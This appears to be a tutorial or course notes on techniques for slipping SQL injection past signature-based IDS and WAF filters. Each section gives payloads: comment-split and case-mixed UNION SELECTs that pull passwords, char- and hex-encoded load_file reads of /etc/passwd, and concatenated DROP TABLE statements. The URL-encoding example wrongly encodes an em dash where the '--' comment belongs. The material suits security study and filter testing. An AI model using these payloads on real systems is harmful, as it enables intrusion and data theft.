# 🕵️ Evasion Techniques
Firewalls and intrusion detection systems (IDS) can detect SQL injection attempts based on predefined signatures. Even if networks include these network security perimeters, attackers use evasion techniques to perform SQL injection without being detected. Such evasion techniques include hex encoding, manipulating white spaces, in-line comments, sophisticated matches, char encoding, and so on. This section will discuss these techniques in detail. 

---
## Evading IDS 
Evading IDS involves attackers hiding malicious inputs so they are not detected by signature-based intrusion detection systems. Since these systems look for known attack patterns, attackers modify their inputs using tricks like encoding, adding extra spaces, breaking inputs into fragments, or rewriting expressions in different forms. These methods make the attack look different from known signatures, allowing it to bypass detection and reach the target system.

## Types of Signature Evasion Techniques 
Different types of signature evasion techniques are listed below:
- **In-line Comment:** Obscures input strings by inserting in-line comments between SQL keywords.
- **Char Encoding:** Uses a built-in CHAR function to represent a character.
- **String Concatenation:** Concatenates text to create an SQL keyword using DB-specific instructions.
- **Obfuscated Code:** Obfuscated code is an SQL statement that has been made difficult to understand.
- **Manipulating White Spaces:** Obscures input strings by inserting a white space between SQL keywords.
- **Hex Encoding:** Uses hexadecimal encoding to represent an SQL query string.\
- **Sophisticated Matches:** Uses alternative expression of `”OR 1=1”`.
- **URL Encoding:** Obscures an input string by adding the percent sign (%) before each code point.
- **Null Byte:** Uses the null byte (%00) character prior to a string to bypass the detection mechanism.
- **Case Variation:** Obfuscates SQL statement by mixing it with upper and lower case letters.
- **Declare Variables:** Uses variables to pass a series of specially crafted SQL statements and bypass the detection mechanism.
- **IP Fragmentation:** Uses packet fragments to obscure the attack payload, which goes undetected by the signature mechanism.
- **Variations:** Uses a WHERE statement that is always evaluated as “true”, so that any mathematical or string comparison can be used.

## Evasion Technique: In-line Comment 
The **in-line comment evasion technique** is used in SQL Injection to bypass filters that block or strip white spaces. Instead of using normal spaces, attackers insert SQL comments (`/**/`) inside keywords. This makes the query still valid for the database but harder for filters to detect, since the keywords are broken up.

Example 1:
```sql
'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/username/**/LIKE/**/'admin'--
```
Here, `UNION SELECT password FROM Users WHERE username LIKE 'admin'--` is disguised with `/**/` comments instead of spaces, tricking filters.

Example 2:
```sql
'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/Users/**/WHE/**/RE/**/username/**/LIKE/**/'admin'--
```
In this case, even the keyword itself (`UNION SELECT ...`) is split into smaller parts with comments. The database still understands it, but many detection systems fail to recognize it as malicious.

## Evasion Technique: Char Encoding 
Char encoding is an evasion technique where attackers use the `char()` function to hide malicious SQL injection inputs. Instead of writing text directly, they encode it as hexadecimal or decimal values, which the SQL engine then converts back into characters. This helps bypass security filters that look for common SQL keywords or patterns, making it harder for detection systems to block the attack.

For example:
- **Load files in unions (string = "/etc/passwd")**
  ```sql
  ' union select 1, (load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
  ```
- **Inject without quotes (string = "%")**
  ```sql
  ' or username like char(37);
  ```
- **Inject without quotes (string = "root")**
  ```sql
  ' union select * from users where login = char(114,111,111,116);
  ```
- **Check for existing files (string = "n.ext")**
  ```sql
  ' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
  ```

## Evasion Technique: String Concatenation 
String concatenation is an evasion technique where attackers split keywords into smaller parts and join them at the SQL level, making it harder for intrusion detection systems to recognize malicious queries. Since IDS usually matches full keywords, breaking them into pieces bypasses signature detection.
A simple string can be broken into two pieces and then concatenated with a “+” sign in an SQL server database (in Oracle, the “||” sign is used to concatenate the two strings). 

Examples:
* **MSSQL:** `OR 'Simple'='Sim'+'ple'`
* **Oracle:** `; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'`
* **MSSQL:** `; EXEC ('DRO' + 'P T' + 'AB' + 'LE')`
* **MySQL:** `; EXECUTE CONCAT('INSE','RT US','ER')`
By rebuilding commands through concatenation, attackers can hide SQL injection attempts from security filters.

## Evasion Technique: Obfuscated Code 
Obfuscated code is an evasion technique used by attackers to hide malicious SQL queries so that intrusion detection systems (IDS) cannot recognize them. There are two ways to obfuscate a malicious SQL query to avoid detection by the IDS. 

1. **Wrapping** → Attackers hide malicious SQL queries using special wrapping tools, making them look different so that IDS cannot recognize and block them.
2. **SQL String Obfuscation** → Attackers break SQL commands into pieces, use tricks like concatenation, encryption, or hashing, and then rebuild them at runtime, bypassing IDS detection.

**Examples of obfuscating the string “qwerty”:**
```sql
Reverse(concat(if(1,char(121),2),0x74,right(left(0x567210,2),1),lower(mid('TEST',2,1)),replace(0x7074,'pt','w'),char(instr(123321,33)+110)))
Concat(unhex(left(crc32(31337),3)-400),unhex(ceil(atan(1)*100-2)),unhex(round(log(2)*100)-4),char(114),char(right(cot(31337),2)+54),char(pow(11,2)))
```
**Example of bypassing a signature:** <br>
Normal request:
```sql
/?id=1+union+(select+1,2+from+test.users)
```
Obfuscated requests to bypass IDS:
```sql
/?id=(1)unIon(selEct(1),mid(hash,1,32)from(test.users))
/?id=1+union+(sELect'1',concat(login,hash)from+test.users)
/?id=(1)union(((((((select(1),hex(hash)from(test.users))))))))
```
These variations change the appearance of the query while keeping the same malicious function, making them harder for IDS to detect.

## Evasion Technique: Manipulating White Spaces
Manipulating white spaces is an evasion technique attackers use to bypass SQL injection detection systems. By adding, removing, or replacing spaces with special characters like tabs, carriage returns, or line feeds, they change how the query looks without affecting how it runs in the database. Since detection tools often rely on exact signatures, this makes malicious queries harder to spot.

For example:
* `"UNION SELECT"` can be written as `"UNION    SELECT"` or with hidden characters in between.
* Dropping spaces also works, such as writing `"'OR'1'='1'"` instead of `"' OR '1'='1'"`.
Both versions still execute correctly in many databases but evade simple signature-based filters.

## Evasion Technique: Hex Encoding 
Hex encoding is an evasion technique where attackers convert SQL keywords into their hexadecimal form to bypass security systems like IDS, which often fail to detect encoded payloads. This allows attackers to hide malicious queries and execute SQL injection without being flagged. For example, the keyword `SELECT` can be written as `0x73656c656374`, making it harder for signature-based protections to recognize.

Some examples are:
* `SELECT @@version` → `0x73656c65637420404076657273696f6e`
* `DROP Table CreditCard` → `0x44524f50205461626c652043726564697443617264`
* `INSERT into USERS (‘certifiedhacker', 'qwerty')` → `0x494e5345525420696e746f2055534552532028276365727469666965646861636b6572272c20277177657274792729`
By using such encoding, attackers can run harmful queries while avoiding detection.

## Evasion Technique: Sophisticated Matches
Sophisticated matches are an SQL injection evasion technique where attackers slightly modify classic payloads like `OR 1=1` to bypass signature-based detection. Since security systems rely on regular expressions to block known patterns, attackers use alternative but logically equivalent expressions.

For example:
* Instead of `OR 1=1`, an attacker may use:
  ```sql
  OR 'john'='john'
  ```
* If blocked, they may alter it further by adding `N` before the string:
  ```sql
  OR 'john'=N'john'
  ```
These variations achieve the same result—always evaluating to true—while avoiding detection from signature filters.

The various SQL injection characters are as follows:
- `' or "` character string indicators 
- `--or #` single-line comment
- `/*...*/` multiple-line comment
- `+` addition, concatenate (or space in URL)
- `||` (double pipe) concatenate
- `%` wildcard attribute indicator
- `?Param1=foo&Param2=bar` URL Parameters
- `PRINT` useful as non-transactional command
- `@variable` local variable
- `@@variable` global variable
- `waitfor delay '0:0:10'` time delay

Examples for evading `' OR 1=1` signature:
```sql
OR 'john' = 'john'
' OR 'microsoft' = 'micro'+'soft'
' OR 'movies' = N'movies'
' OR 'software' like 'soft%'
' OR 7 > 1
' OR 'best' > 'b'
' OR 'whatever' IN ('whatever')
' OR 5 BETWEEN 1 AND 7
```

## Evasion Technique: URL Encoding 
URL encoding is an evasion technique used to bypass input filters and hide malicious SQL queries. It works by replacing characters with their ASCII hexadecimal codes, each starting with a `%`. For example, a single quote (`'`) has ASCII code `0x27`, so it becomes `%27`.

Example of a normal SQL injection query:
```sql
' UNION SELECT Password FROM Users_Data WHERE name='Admin'--
```
After URL encoding, it becomes:
```sql
%27%20UNION%20SELECT%20Password%20FROM%20Users_Data%20WHERE%20name%3D%27Admin%27%E2%80%94
```
If basic encoding is blocked, attackers may use **double URL encoding**, where `%` itself is encoded as `%25`.

So the same query after double encoding looks like:
```sql
%2527%2520UNION%2520SELECT%2520Password%2520FROM%2520Users_Data%2520WHERE%2520name%253D%2527Admin%2527%25E2%2580%2594
```
Here, the string `%27` (single quote) becomes `%2527`, making it harder for filters to detect the attack.

## Evasion Technique: Null Byte 
A null byte evasion technique is used by attackers to bypass security filters like WAF or IDS. The null byte `%00` is treated differently by programming languages: in C/C++ it marks the end of a string, but in higher-level languages like PHP or ASP it may be ignored. Attackers take advantage of this difference to inject malicious input without being blocked.

For example, a normal SQL injection attempt might be:
```sql
' UNION SELECT Password FROM Users WHERE UserName='admin'--
```
If blocked by a security system, the attacker adds a null byte:
```sql
%00' UNION SELECT Password FROM Users WHERE UserName='admin'--
```
This tricks the filter, allowing the attacker to bypass detection and extract the admin password.

## Evasion Technique: Case Variation 
By default, in most database servers, SQL is case insensitive. Owing to the case-insensitive option of regular expression signatures in the filters, attackers can mix upper and lower case letters in an attack vector to bypass the detection mechanism. <br>
For example, consider that the filter is designed to detect the following queries: 
```sql
union select user_id, password from admin where user_name=’admin’--
UNION SELECT USER_ID, PASSWORD FROM ADMIN WHERE USER_NAME=’ADMIN’--
```
Then, the attacker can easily bypass the filter using the following query: 
```sql
UnIoN sEleCt UsEr_iD, PaSSwOrd fROm aDmiN wHeRe UseR_NamE=’AdMIn’--
```

## Evasion Technique: Declare Variables 
Evasion using variable declaration is a technique where attackers hide malicious SQL queries inside variables to bypass security systems like IDS. Instead of writing the full query directly, they split and redefine it in parts, making it harder to detect.

For example, instead of injecting:
```sql
UNION SELECT Password
```
the attacker rewrites it as:
```sql
; declare @sqlvar nvarchar(70);  
set @sqlvar = (N'UNI' + N'ON' + N' SELECT' + N'Password');  
EXEC(@sqlvar)
```
This execution retrieves all stored passwords while avoiding signature-based detection.

## Evasion Technique: IP Fragmentation 
IP fragmentation is an evasion technique where an attacker breaks a malicious IP packet into many small fragments before sending it to the target. Since intrusion detection systems (IDS) and web application firewalls (WAF) usually inspect packets individually, they may fail to detect the complete attack string. Attackers can also manipulate these fragments to make reassembly harder, further hiding the malicious payload.

**Example:**
A full malicious request like `UNION SELECT password FROM users` can be split across multiple fragments:

* Fragment 1: `UNI`
* Fragment 2: `ON SEL`
* Fragment 3: `ECT password FROM users`

When inspected separately, none of these fragments match a known attack signature, but once reassembled by the target system, it becomes a working SQL injection payload.

Various ways to evade signature mechanisms using IP fragments are listed below:
- Pause when sending parts of an attack in the hope that the IDS will time-out before the target computer does
- Send the packets in reverse order
- Send the packets in proper order, except for the first fragment, which is sent last
- Send the packets in proper order, except the last fragment, which is sent first
- Send packets out of order or randomly

## Evasion Technique: Variation 
Variation is an SQL injection evasion technique where attackers modify basic injection patterns so that security filters fail to detect them. Instead of always using simple logic like `OR 1=1`, the attacker inserts different forms such as string comparisons, math expressions, or concatenated values that still evaluate to true. The goal is to ensure the `WHERE` clause always returns true, giving unauthorized access.

For example, all of these queries produce the same result set because the condition is always true:
```sql
SELECT * FROM accounts WHERE userName = 'Bob' OR 1=1 --  
SELECT * FROM accounts WHERE userName = 'Bob' OR 2=2 --  
SELECT * FROM accounts WHERE userName = 'Bob' OR 1+1=2 --  
SELECT * FROM accounts WHERE userName = 'Bob' OR "evade"="ev" + "ade" --  
```
By creating endless variations, attackers can bypass filters while still successfully injecting malicious queries.
